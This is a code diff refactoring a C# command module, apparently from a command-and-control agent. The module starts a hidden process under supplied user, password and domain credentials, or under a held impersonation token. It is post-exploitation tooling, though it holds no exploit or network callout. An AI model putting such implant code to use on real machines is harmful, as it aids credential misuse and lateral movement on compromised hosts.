@@ -1,26 +1,29 @@
 ﻿using Agent.Helpers;
 using Agent.Models;
 using System;
+using System.Threading.Tasks;
+using System.Threading;
 using WinAPI;
 using WinAPI.Wrapper;
+using Shared;
 
 namespace Agent.Commands
 {
     public class StartASCommand : AgentCommand
     {
-        public override string Name => "startas";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.StartAs;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            string usr = task.SplittedArgs[0];
-            string password = task.SplittedArgs[1];
+            task.ThrowIfParameterMissing(ParameterId.Command);
+            string cmd = task.GetParameter<string>(ParameterId.Command);
 
-            var tab = usr.Split('\\');
-            var username = tab[1];
-            var domain = tab[0];
+            task.ThrowIfParameterMissing(ParameterId.User);
+            task.ThrowIfParameterMissing(ParameterId.Password);
+            task.ThrowIfParameterMissing(ParameterId.Domain);
 
-            var filename = task.SplittedArgs[2];
-            //var args = task.SplittedArgs[3];
-            //string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
+            var domain = task.GetParameter<string>(ParameterId.Domain);
+            var password = task.GetParameter<string>(ParameterId.Password);
+            var username = task.GetParameter<string>(ParameterId.User);
 
             ProcessCredentials creds = new ProcessCredentials()
             {
@@ -31,15 +34,15 @@ namespace Agent.Commands
 
             var creationParms = new ProcessCreationParameters()
             {
-                Command = filename /*+ " " + args*/,
+                Command = cmd,
                 RedirectOutput = false,
                 CreateNoWindow = true,
                 CurrentDirectory = Environment.CurrentDirectory,
                 Credentials = creds,
             };
 
-            if (ImpersonationHelper.HasCurrentImpersonation)
-                creationParms.Token = ImpersonationHelper.ImpersonatedToken;
+            if (context.Agent.ImpersonationToken != IntPtr.Zero)
+                creationParms.Token = context.Agent.ImpersonationToken;
 
             var procResult = APIWrapper.CreateProcess(creationParms);
 
@@ -50,7 +53,7 @@ namespace Agent.Commands
             }
 
             if (creationParms.RedirectOutput)
-                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                APIWrapper.ReadPipeToEnd(procResult.OutPipeHandle, output => context.AppendResult(output, false));
         }
     }
 }
